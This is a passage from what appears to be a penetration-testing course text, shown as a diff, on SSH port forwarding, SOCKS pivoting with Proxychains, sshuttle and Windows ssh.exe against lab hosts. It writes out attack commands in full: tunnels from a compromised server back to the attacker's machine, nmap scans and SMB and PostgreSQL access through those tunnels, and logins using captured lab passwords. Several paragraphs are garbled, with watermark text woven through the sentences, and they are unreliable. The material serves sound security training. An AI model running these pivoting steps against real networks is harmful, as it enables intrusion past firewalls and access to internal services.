+[ProxyList]
+
+# add proxy here ...
+
+# meanwile
+
+# defaults set to "tor"
+
+<cr>socks5 192.168.50.63 9999</cr>
+
+   Listing 587 - The Proxychains configuration file, pointing towards the SOCKS proxy set up on CONFLUENCE01.
+
+With Proxychains properly configured, we can use smbclient from our Kali machine to enumerate
+available shares on HRSHARES. Rather than connecting to the port on CONFLUENCE01, we'll
+write the smbclient command as though we have a direct connection to PGDATABASE01. As
+before, we will specify -L to list the available shares, pass the username with -U, and password
+with --password.
+
+Next, we can simply prepend proxychains to the command. Proxychains will read the
+configuration file, hook into the smbclient process, and force all traffic through the SOCKS proxy
+we specified.
+
+kali@kali:~$ <cu>proxychains smbclient -L //172.16.50.217/ -U hr_admin --
+
+password=Welcome1234</cu>
+
+[proxychains] config file found: /etc/proxychains4.conf
+
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+
+[proxychains] DLL init: proxychains-ng 4.16
+
+[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:445 ... OK
+
+          Sharename      Type       DRCR-oeee-mfmm-maoo-tteu-Jenle-ett-fIAfPdsrmhCeaiyrneWhitlow
+          ---------      ----
+          ADMIN$         Disk
+          C$             Disk
+          IPC$           IPC
+   <cr>scripts           Disk</cr>
+
+R[[dNpeTpor_c_roocoSxxnoTAnyynccenTUhcehUctSaas_iiitenn:nRrgssEs]]SCwoOSnSUiRnttterCrhiiEcS_cctMttiNABonccM1hEha_aftDioiNoinnrOsT1kw_7Oo.2F.S..Or.-.Uk.156gN77.rD5)o5112909u12p2.92..0l111676i88sft..55aii0n0.gl..6e633d::9(999Er999r9or......  172.16.50.217:139  ...  OK
+                                                                                                                                                                                                                                                172.16.50.217:139  ...  OK
+
+Unable to connect with SMB1 -- no workgroup available
+
+kali@kali:~$
+
+   Listing 588 - smbclient connecting to HRSHARES through the SOCKS proxy using Proxychains.
+
+The connection was a success! We've managed to connect to HRSHARES and list its shares,
+including an interesting folder called scripts. We receive some extra output from Proxychains too,
+including the ports that were interacted with while the process was running.
+
+Let's escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We'll use a
+TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only
+check the top 20 ports (--top-ports=20). We will then prepend proxychains to the command again
+to push all packets through the SSH dynamic port forward SOCKS proxy. We'll also increase the
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                    632
+                                                                                                           Penetration Testing with Kali Linux
+
+verbosity using -vvv. We need to use sudo because Nmap scanning requires raw socket or packet
+crafting capabilities, which needs elevated privileges.
+
+ Info
+
+Nmap has a built-in --proxies option. However, according to its documentation, it's "still
+
+under development" and not suitable for port scanning. As such, we use Proxychains
+
+again in this example.
+
+kali@kali:~$ <cu>sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217</cu>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be
+slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
+Initiating Parallel DNS resolution of 1 host. at 17:26
+Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
+DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR:
+1, CN: 0]
+
+Initiating Connect Scan at 17:26
+Scanning 172.16.50.217 [20 ports]
+[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:111 <--socket
+error or timeout!
+[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:22 <--socket
+error or timeout!
+...
+[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:5900 <--socket
+
+error or timeout!
+
+Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
+
+Nmap scan report for 172.16.50.217                                                                Whitlow
+Host is up, received user-set (9.0s latency).
+Scanned at 2022-08-20 17:26:47 EDT for 244s
+
+PORT     STATE SERVICE   ccRcEooonnnASnnnO---NrrreeefffuuuJssseeeefdddfrey
+21/tcp   closed ftp      OS-ccccc5ooooo77nnnnn5nnnnn2-----1rrrrr9eeeee0fffffuuuuussssseeeeeddddd
+22/tcp   closed ssh
+23/tcp   closed telnet
+
+25/tcp   closed smtp
+53/tcp   closed domain
+80/tcp   closed http
+110/tcp  closed pop3
+111/tcp  closed rpcbind
+
+135/tcp open msrpc       syn-ack
+
+139/tcp open netbios-ssn syn-ack
+
+143/tcp closed imap      conn-refused
+
+443/tcp closed https     conn-refused
+
+445/tcp open microsoft-ds syn-ack
+
+993/tcp closed imaps     conn-refused
+
+995/tcp closed pop3s     conn-refused
+
+1723/tcp closed pptp     conn-refused
+
+3306/tcp closed mysql    conn-refused
+
+3389/tcp open ms-wbt-server syn-ack
+
+5900/tcp closed vnc      conn-refused
+
+8080/tcp closed http-proxy conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                   633
+                                                                          Penetration Testing with Kali Linux
+
+                                        Listing 589 - The Nmap-over-Proxychains command output.
+
+The scan was a success! Proxychains gives us insight into each socket that was attempted and,
+if the connection failed, notes how. Nmap found TCP ports 135, 139, 445, and 3389 are open.
+
+      Info
+     By default, Proxychains is configured with very high time-out values. This can make port
+     scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values
+     in the Proxychains configuration file will force Proxychains to time-out on non-
+     responsive connections more quickly. This can dramatically speed up port-scanning
+     times.
+
+In this section, we set up a dynamic port forward and used Proxychains to push traffic from both
+smbclient and Nmap through the SOCKS proxy port that was created. We subsequently managed
+to list the shares on, as well as port scan, HRSHARES.
+
+19.3.3 SSH remote port forwarding
+
+In our examples so far, we've been able to connect to any port we bind on the WAN interface of
+CONFLUENCE01. This is more challenging in the real world because, often, firewalls - both
+hardware and software - are likely to get in the way. Inbound traffic is often controlled much more
+aggressively than outbound traffic. Only in rare cases will we compromise credentials for an SSH
+user, allowing us to SSH directly into a network and port forward. We will only very rarely be able
+to access ports that we bind to a network perimeter.
+
+However, we will more often be able to SSH out of a network. Outbound connections are more
+ncdoeifemfidcm.uSlotont,owncehotiwlnetorirtoklliktthreaalyfnfwicinoobnuo'ttubn-edinpccoolsunsdniibenlcgetitSooSncsHo. nM- nfooescrttrWcethooairstapoloponrwosarttoewfneseimtbwinpodlircktisotywt,huiellsnaabellotilwiwtyo,mrkaanpndeyrbitmuypseietneser,soisft
+SWawTatnhSithldiaHlsiolcbefkriisteineenmdrnwlomotbhhcteaeeearypllepiaoseontsSxredsetSnicHfbdiounlyetrgnrewetapomaamorSrodritcSetinetmHphgoepoocrrotuetOeart.Sftn.osW-f5hrbowe7eer7lwacl5uraa2pdsn1raiedn9ytdi0ghlno,igtnJatoehkdcfecoaftolofrninseitcntybeloeienknceitnneaexgbtcarprteecovmbkreatterciosslkyeabtsunoohsuaeeantlfnldtu,ablatc.outkIttneathfrco-eakcreoSpsrnSio-mctHrrotoilncfallolterirerdownwlltSaea,rSdyidnHiltnrihsegstame.etrnovaeteenrr,
+port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding
+being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.
+
+Let's reconsider our lab scenario and take a small step backwards.
+
+As before, we compromise CONFLUENCE01 using CVE-2022-26134. However, in this scenario,
+the administrators decided to improve network security by implementing a firewall at the
+perimeter. The firewall is configured so that, regardless of whether we bind a port on the WAN
+interface of CONFLUENCE01 or not, the only port we can connect to from our Kali machine is
+TCP 8090.
+
+As we did in the Socat section, we want to enumerate the PostgreSQL database running on port
+5432 on PGDATABASE01. CONFLUENCE01 doesn't have the tools to do this. Because of the
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  634
+                                                                                                                              Penetration Testing with Kali Linux
+
+firewall, we can't create any port forward that requires opening the listening port on
+CONFLUENCE01.
+However, CONFLUENCE01 does have an SSH client, and we can set up an SSH server on our Kali
+machine. We can create a port forwarding setup much like the following diagram:
+
+                              Figure 265: The SSH remote port forward setup
+
+We can connect from CONFLUENCE01 to our Kali machine over SSH. The listening TCP port
+2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed
+by the Kali SSH server software through the SSH tunnel back to the SSH client on
+CONFLUENCE01. They are then forwarded to the PostgreSQL database port on PGDATABASE01.
+
+Let's set this up in our lab. First, we'll need to enable the SSH server on our Kali machine.
+
+OpenSSH server is preinstalled - all we need to do is start it.
+                                                        Wyhoiut'lvoewset
+ Warning    start  the  Kali  SSH  server,  make  sure                    a  strong,  unique  password                                                                                                                                                                                             for
+Before you
+
+kN[Wksaaeellutdiiicto@d@ahk]kneaaSlptlcKaiaiha::steles~~ic$$wukost<<Rrehecdcracuu! tv>>ft-osshQurueddSookSeaSnslsHdyisLs:-isptQ-toiennrmgLtOtcopS5itlc-s9lau50o<l7-p7s/S5etcAta2adunr1r>dtai9trn0sgesstwJhsseeeh:fS<PefS/orxHcreputyse>ecrPvteeeerdrounAsthdinedgKraeslsisms.:aPcohirnte. Process
+
+<cr>tcp LISTEN 0        128                 0.0.0.0:22                    0.0.0.0:*
+
+users:(("sshd",pid=181432,fd=3))</cr>
+
+<cr>tcp LISTEN 0        128                 [::]:22                          [::]:*
+
+users:(("sshd",pid=181432,fd=4))</cr>
+
+            Listing 591 - Checking that the SSH server on the Kali machine is listening.
+
+The SSH server is listening on port 22 on all interfaces for both IPv4 and IPv6.
+
+Once we have a reverse shell from CONFLUENCE01, we ensure we have a TTY shell, then create
+an SSH remote port forward as part of an SSH connection back to our Kali machine.
+
+      Info
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                635
+                                                                                                                  Penetration Testing with Kali Linux
+
+To connect back to the Kali SSH server using a username and password you may have
+to explicitly allow password-based authentication by setting PasswordAuthentication to
+yes in /etc/ssh/sshd_config.
+
+The SSH remote port forward option is -R and has a very similar syntax to the local port forward
+option. It also takes two socket pairs as the argument. The listening socket is defined first, and
+the forwarding socket is second.
+
+In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345) and forward all
+traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>python3 -c 'import pty;
+pty.spawn("/bin/sh")'</cu>
+</bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ <cu>ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4</cu>
+< 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
+ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <cu>yes</cu>
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+kali@192.168.118.4's password:
+
+                      Listing 592 - The SSH remote port forward being set up, connecting to the Kali machine.
+
+The SSH connection back to our Kali machine was successful.
+
+We can confirm that our remote port forward port is listening by checking if port 2345 is open on
+                                   0A.d01d.2[r07:e.:.sJ00]se:.::f022Pf.22or1re:ty23PW4ehi5etrlo0Aw.d0d[.r0:0e.:.s0]0s:.::*0*P.o0r:t*P<r/occre>ss
+our Kali loopback interface.
+
+kali@kali:~$ <cu>ss -ntplu</cu>
+
+Netid State Recv-Q Send-Q Local
+
+<cr>tcp LISTEN 0              128
+
+tcp LISTEN 0             128
+
+tcp LISTEN 0             128
+
+It is! Our port forward  iLsisntinogw59s3eO-tSC-uh5pe7c7ak5sin2gw19ife0pionrtte2n34d5eids,bwouitnhd  on the Kali  SSH server.                     command  running
+on CONFLUENCE01.
+                                                                                                     the SSH      port forward
+
+                         Figure 266: The SSH remote port forward command running
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                   636
+                                                                                                                                                                        Penetration Testing with Kali Linux
+
+With the port forward active, we can now query port 2345 on the Kali loopback interface as
+though interacting directly with the PostgreSQL service on PGDATABASE01. On our Kali machine,
+we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (-p), and using the database
+credentials of the postgres user (-U) we found earlier on CONFLUENCE01.
+
+kali@kali:~$ <cu>psql -h 127.0.0.1 -p 2345 -U postgres</cu>
+Password for user postgres:
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
+compression: off)
+Type "help" for help.
+
+postgres=# <cu>\l</cu>
+
+                              List of databases
+
+Name | Owner | Encoding | Collate | Ctype | Access privileges
+
+------------+----------+----------+-------------+-------------+-----------------------
+
+confluence | postgres | UTF8  | en_US.UTF-8 | en_US.UTF-8 |
+
+postgres | postgres | UTF8    | en_US.UTF-8 | en_US.UTF-8 |
+
+template0 | postgres | UTF8   | en_US.UTF-8 | en_US.UTF-8 | =c/postgres                                                                                                                                      +
+
+          |             |     |                                              |                                                                                          | postgres=CTc/postgres
+
+template1 | postgres | UTF8   | en_US.UTF-8 | en_US.UTF-8 | =c/postgres                                                                                                                                      +
+
+          |             |     |                                              |                                                                                          | postgres=CTc/postgres
+
+(4 rows)
+
+postgres=#
+           Listing 594 - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward.
+
+Success! We're now interacting with the PostgreSQL instance running on PGDATABASE01
+
+dItnhartotahubisgahsseoeucstreioSrvnSe,HrwfrereommcroetoaeutperodKrtaaflniomrSwSaaHcrhdirnbeemy. coWotenenpdeoicdrttitnhfgoisWrthwowiatphrloidolrewtt2tor3aa4vl5eloroswninuogsuartoopwecrnoimnKneaetleicmrt fatiorcehwainnaelli.,nwtehrnicahl
+                        ingbivoeusnduscodnirneecctt, iocnosnJ.terfofllreedy
+would  otherwise block                                                       access  to  internal                                                                       services  through  an  SSH
+Local  port forwarding
+
+tt1au9rngn.e3et.li.n4HgomwuelvtiepSrle,SbsHeycsarteeumsmesoeoatrecshOedSrf-yvo5inrc7wea7as5m2r--d1ei9cms0papepocsirattlolyfooinnrlwfyasaotnr-mde iosnovgicnkgerte, idt  can become unwieldy  when
+                                                                                                                                                                        team operations.
+
+With remote port forwarding, we were able to forward packets to one socket per SSH connection.
+However, just as we found with local port forwarding, this single-socket-per-connection limitation
+can slow us down. We often want more flexibility when attacking networks, especially in the
+enumeration stages.
+
+Luckily, remote dynamic port forwarding can provide this flexibility. Just as the name suggests,
+remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The
+SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.
+
+To conceptualize how useful this might be, let's apply it to our previous scenario. The following
+diagram illustrates how the network layout would improve if we were to apply remote dynamic
+port forwarding to the remote port forwarding scenario.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                       637
+                                                                                                                                        Penetration Testing with Kali Linux
+
+Figure 267: The SSH remote dynamic port forward layout applied to the remote port forward scenario
+
+It's much more flexible. Suddenly, we can connect to other ports and hosts through the same
+connection.
+
+Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain
+all the flexibility of traditional dynamic port forwarding alongside the benefits of the remote
+configuration. We can connect to any port on any host that CONFLUENCE01 has access to by
+passing SOCKS-formatted packets through the SOCKS proxy port that is bound on our Kali
+machine.
+
+ Info
+
+Remote dynamic port forwarding has only been available since October 2017's OpenSSH
+
+7.6. Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the
+
+DLeMt Zesxneterevtnewdrovorekur.rsTisohcneednfioareerwisona'atllgmparaientvt.eeTrn.htsisutsimfreomwecofinnndeacWthiWintgilnotdowowansy  server (MULTISERVER03)                     on   the
+                                                                                                                                        port on MULTISERVER03,                     or   any
+pCenoOurNtmFoeLthrUaeEtriNnthgCaEMn0U1TLCtToPIS/o8Eu0Rr9KV0aElRoi n0m3CafcOrhoNimnFeL,KUtahEleiN.nCcEJre0ef1aftrfereoyamreomuor tKeadliymnaamchicinpeo. rBtufot rwwearcdansoSwSHe
+                                                                                                                                                                                   out  from
+                                                                                                                                                                                   can  start
+
+Once connected, our network sOhSo-u5l7d75b2e1o90rganized much like the following diagram:
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                638
+                                                                          Penetration Testing with Kali Linux
+
+Figure 268: The SSH remote dynamic port forward setup we are aiming for
+
+The SSH session is initiated from CONFLUENCE01, connecting to the Kali machine, which is
+running an SSH server. The SOCKS proxy port is then bound to the Kali machine on TCP/9998.
+Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where
+they will be forwarded based on where they're addressed - in this case, MULTISERVER03.
+
+To demonstrate exactly how useful remote dynamic port forwarding can be, let's set up an
+
+example in the lab. Once we have a reverse shell from CONFLUENCE01, have spawned a TTY
+
+shell within it, and have enabled SSH on    cooumr KmaalinWdmhiatilcsohwinreel,awtiveelcyansismtaprlet ,craalftthinogugthhe  remote
+dynamic port forwarding command.                                                                                             (slightly
+                                            Jcpeelvoafersftnsrfeinocyerrweedamrtdoo,tewsppeeopcraitfsyfosarownnaIlPyrdoainndged.rsTeoshcsek; ediftif:wftehereejunsscotecpkisaestthswaaet
+The remote dynamic port forwarding
+
+confusingly) it uses the same -R option as
+when we want to create a remote dynamic
+want to listen on the SSH server. We don't
+pspTporoeervtbc,eiiinfntydtw-atRilhlse9bhe9Se9lObl8ofCrutoKonmSdthpbteoreoiStnxhSygeHtoloopcoepopnoOmberStamd-c59.a7k9n79i5nd82te1wo9renf0artcuheneoolfontohpCebOSaNcSFkHLinUsetEerNvrfeCarEcbe0y1od.feWofaueu'rlllKta.alsliompaacshsinthee, w-Ne
+                                                                                                                                                                                                                                                   simply
+                                                                                                                                                                                                                                                   flag to
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>python3 -c 'import pty;
+pty.spawn("/bin/bash")'</cu>
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>ssh -N -R 9998
+kali@192.168.118.4</cu>
+<n/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
+ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <cu>yes</cu>
+yes
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                           639
+                                                                                                                                                                                        Penetration Testing with Kali Linux
+
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+kali@192.168.118.4's password:
+
+                     Listing 595 - Making the SSH connection with the remote dynamic port forwarding option.
+
+Back on our Kali machine, we can check that port 9998 is bound by using ss.
+
+kali@kali:~$ <cu>sudo ss -ntplu</cu>
+
+Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+
+<cr>tcp LISTEN 0           128                       127.0.0.1:9998                                     0.0.0.0:*
+
+users:(("sshd",pid=939038,fd=9))</cr>
+
+tcp LISTEN 0          128                            0.0.0.0:22                                    0.0.0.0:*
+
+users:(("sshd",pid=181432,fd=3))
+
+<cr>tcp LISTEN 0           128                       [::1]:9998                                                                                                                         [::]:*
+
+users:(("sshd",pid=939038,fd=7))</cr>
+
+tcp LISTEN 0          128                            [::]:22                                            [::]:*
+
+users:(("sshd",pid=181432,fd=4))
+
+          Listing 596 - Port 9998 bound to both IPv4 and IPv6 loopback interfaces on the Kali machine.
+
+The SOCKS proxy port has been bound on both the IPv4 and IPv6 loopback interfaces on our Kali
+machine. We're ready to use it!
+
+Just as we did in the classic dynamic port forwarding example, we can use Proxychains to tunnel
+traffic over this SOCKS proxy port. We'll edit our Proxychains configuration file at
+/etc/proxychains4.conf on our Kali machine to reflect our new local SOCKS proxy port.
+
+kali@kali:~$ <cu>tail /etc/proxychains4.conf</cu>
+
+#        proxy types: http, socks4, socks5, raw
+
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+
+#         ( auth types supported: "basic"-http "user/pass"-socks )
+                                                                               Whitlow
+#
+[ProxyList]
+# add proxy here ...
+
+# meanwile                                           configuJreaftiofnrefiyle  to  point  to  the  new  SOCKS                                                                           proxy  on  port  9998.
+# defaults set to "tor"
+<cr>socks5 127.0.0.1 9998</cr>
+
+              Listing 597 - Editing the Proxychains
+krNeaealxcith@, kawabelleiru:sn~e$rnvm<icceausp>ptthhrrorooxuuyggchhhatpihrneosOxSSynO-cm5Cha7Ka7p5iSn2-sp1v,9rvto0vaxryg-sepTtrien-vg-ioMtuoUspl-LypTeoIsSrttEasRb=Vl2isE0hRe-0dP3.n.
+                                                                                                                                                                                        This allows us to enumerate
+
+                                                                                                                                                                                        -n 10.4.50.64</cu>
+
+[proxychains] config file found: /etc/proxychains4.conf
+
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+
+[proxychains] DLL init: proxychains-ng 4.16
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be
+
+slower.
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 06:25 EDT
+
+Initiating Connect Scan at 06:25
+
+Scanning 10.4.50.64 [20 ports]
+
+[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:22 <--socket error or
+
+timeout!
+
+...
+
+[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:135 ... OK
+
+Discovered open port 135/tcp on 10.4.50.64
+
+Completed Connect Scan at 06:28, 210.26s elapsed (20 total ports)
+
+Nmap scan report for 10.4.50.64
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                        640
+                                                                                                                Penetration Testing with Kali Linux
+
+Host is up, received user-set (6.7s latency).
+Scanned at 2022-07-20 06:25:25 EDT for 210s
+
+PORT  STATE SERVICE     REASON
+
+21/tcp closed ftp       conn-refused
+
+22/tcp closed ssh       conn-refused
+
+23/tcp closed telnet    conn-refused
+
+25/tcp closed smtp      conn-refused
+
+53/tcp closed domain    conn-refused
+
+<cr>80/tcp open http    syn-ack</cr>
+
+110/tcp closed pop3     conn-refused
+
+111/tcp closed rpcbind  conn-refused
+
+<cr>135/tcp open msrpc  syn-ack</cr>
+
+139/tcp closed netbios-ssn conn-refused
+
+143/tcp closed imap     conn-refused
+
+443/tcp closed https    conn-refused
+
+445/tcp closed microsoft-ds conn-refused
+
+993/tcp closed imaps    conn-refused
+
+995/tcp closed pop3s    conn-refused
+
+1723/tcp closed pptp    conn-refused
+
+3306/tcp closed mysql   conn-refused
+
+<cr>3389/tcp open ms-wbt-server syn-ack</cr>
+
+5900/tcp closed vnc     conn-refused
+
+8080/tcp closed http-proxy conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 210.31 seconds
+
+              Listing 598 - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains.
+
+AfterSacafInenwfnoinmginisutaelsit,twleesrleocweeivreagoauirnrsetstuhlitssWanindddoiwscsoWhvhoeisrttlpo-owlritksel8y0d, u1e35to, atnhde  3389 are open.
+    thiWs isnedcotwiosn,fiwreewuasllerdesSpSoHndresmwohteendaynpaomrtJiciesfpfcorloretsyfeodrwcoamrdpinagretdo                           different way the
+
+In                                                                                                              to Linux.                proxy  port  on    our
+                                                                                                                open a SOCKS
+
+K1Pra9oli.x3my.c5ahcahininsetobUyposinritintsiagctaisnngsahahunotsStOtSlSeoH-n57ct7ho5en2ni1ne9tc0etrinoanl  from a remote compromised host. We     then    used
+                                                                                                             network through the SOCKS proxy port.
+
+In situations where we have direct access to an SSH server, behind which is a more complex
+internal network, classic dynamic port forwarding might be difficult to manage. sshuttle is a tool
+that turns an SSH connection into something like a VPN by setting up local routes that force
+traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3
+on the SSH server, so it's not always the most lightweight option. In the appropriate scenario;
+however, it can be very useful.
+
+In our lab environment, we have SSH access to PGDATABASE01, which we can access through a
+port forward set up on CONFLUENCE01. Let's run sshuttle through this to observe its capabilities.
+
+First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the
+WAN interface and forwarding to port 22 on PGDATABASE01.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                    641
+                                                                                                                                                                                Penetration Testing with Kali Linux
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>socat TCP-LISTEN:2222,fork
+TCP:10.4.50.215:22</cu>
+</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+                       Listing 599 - Forwarding port 2222 on CONFLUENCE01 to port 22 on PGDATABASE01.
+
+Next, we can run sshuttle, specifying the SSH connection string we want to use, as well as the
+subnets that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24).
+
+kali@kali:~$ <cu>sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24
+172.16.50.0/24</cu>
+[local sudo] Password:
+
+database_admin@192.168.50.63's password:
+
+c : Connected to server.
+Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found.
+fw: Received non-zero return code 1 when flushing DNS resolver cache.
+
+             Listing 600 - Running sshuttle from our Kali machine, pointing to the forward port on CONFLUENCE01.
+
+Although we don't receive much output from sshuttle, in theory, it should have set up the routing
+on our Kali machine so that any requests we make to hosts in the subnets we specified will be
+pushed transparently through the SSH connection. Let's test if this is working by trying to connect
+to the SMB share on HRSHARES in a new terminal.
+
+kali@kali:~$ <cu>smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234</cu>
+
+Sharename                Type  Comment
+
+---------                ----  -------
+
+ADMIN$                   DIDPiiCsskkDisk</RcRDereemfm>oaotutleetAIsPdhmCiarneWhitlow
+C$
+IPC$
+<cr>scripts
+
+RUNdTneoc_a_bcSonoTlAnenneTtceUtcoSi_tcR:ngoESnCwOoniUnecRtnCehtcEw_StNiMitBAoMn1hEfS_tooNMrBO11T7w_2Fo-.Or-1Ukg6NnrD.o5)o0uw.po2r1lk7igJsreftofaiufinprglee.aydva(iElrarbolre
+kGarleia@t!kWalei':re~$nLoiswtingco60n1n-eCcotninngecttionOgSH-toR57tSh7He5SA2M1R9BE0sShatrrae nonspHaRrSeHnAtRlyE,Sa, wsitthhoouut ganhy
+                                                                                                                                                                                explicit forwarding.  network
+
+                                                                                                                                                                                we are on the same
+
+and have direct access.
+
+In this section, we used sshuttle to create a VPN-like environment. We were then able to connect
+transparently to HRSHARES from our Kali machine, as though we were on the same network as
+PGDATABASE01.
+
+19.4 Port forwarding with Windows tools
+
+This Learning Unit covers the following Learning Objectives:
+� Use ssh.exe and Plink to create port forwards on Windows
+� Understand port forwarding with Netsh
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                              642
+                                                                                                                              Penetration Testing with Kali Linux
+
+So far in this Module, we've discussed the mechanics of port redirection and tunneling using
+Linux-based tools. However, we will often encounter Windows hosts in large networks that also
+require us to practice port forwarding strategies. Thankfully, there are several ways to port
+forward and tunnel on Windows, a few of which we'll cover in this Learning Unit.
+
+19.4.1 ssh.exe
+
+The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018
+Update), and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators
+Update). On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along
+with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.
+
+The fact that the SSH client is compiled for Windows doesn't mean that we can only connect to
+Windows-compiled SSH servers. We can connect to any SSH server we want - as long as we have
+the credentials.
+
+Let's practice this by creating a remote dynamic port forward from MULTISERVER03 (a Windows
+machine) to our Kali machine. In this scenario, only the RDP port is open on MULTISERVER03. We
+can RDP in, but we can't bind any other ports to the WAN interface. Once we have our lab set up,
+it should appear as so:
+
+                                                Whitlow
+                                     Jeffrey
+                      OS-57752190
+
+Figure 269: The SSH remote dynamic port forward setup using the Windows OpenSSH client
+
+We will use the rdp_admin credentials we found earlier to RDP into the server. We'll then use
+ssh.exe to create a remote dynamic port forward connection to our Kali machine. We'll use the
+resulting tunnel to reach the PostgreSQL database service on PGDATABASE01.
+
+First, let's start by making sure the SSH server is running on our Kali machine.
+
+kali@kali:~$ <cu>sudo systemctl start ssh</cu>
+[sudo] password for kali:
+
+kali@kali:~$
+
+              Listing 602 - Starting SSH server on the Kali machine.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                643
+                                                                                          Penetration Testing with Kali Linux
+
+Next, we'll use xfreerdp from FreeRDP to connect to the RDP server on MULTISERVER03.
+
+kali@kali:~$ <cu>xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64</cu>
+
+[15:46:35:297] [468172:468173] [WARN][com.freerdp.crypto] - Certificate verification
+
+failure 'self signed certificate (18)' at stack position 0
+
+[15:46:35:297] [468172:468173] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
+
+[15:46:35:300] [468172:468173] [ERROR][com.freerdp.crypto] -
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - @                                                                                                                                             WARNING:
+
+CERTIFICATE NAME MISMATCH!            @
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] -
+
